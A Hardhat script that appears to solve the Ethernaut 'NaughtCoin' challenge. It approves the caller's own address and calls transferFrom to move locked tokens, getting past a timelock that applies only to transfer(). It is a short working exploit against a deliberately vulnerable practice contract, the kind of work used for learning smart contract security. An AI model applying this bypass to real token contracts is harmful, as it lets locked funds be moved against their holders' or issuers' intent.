const { ethers } = require("hardhat");
const hre = require("hardhat");
async function main() {
    
    //Params
    levelAddress = "0x1d434a6645A446f7c38efd41f66f748278332CA0";
    contractName = "NaughtCoin";

    const account = await hre.ethers.getSigner();
    console.log(`Working with account ${account.address}`);
    const Level = await hre.ethers.getContractFactory(contractName);
    const level = await Level.attach(levelAddress);
    // const level = await Level.deploy();
    console.log(`Level at address ${level.address}`);
    let amount = await level.balanceOf(account.address);
    let approveTx = await level.increaseAllowance(account.address,amount);
    let approvert = await approveTx.wait();
    let tx = await level.transferFrom(account.address,'0x1d434a6645A446f7c38efd41f66f748278332CA0',amount)
    let tr = await tx.wait()


    result = await level.balanceOf(account.address);
    console.log(result);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
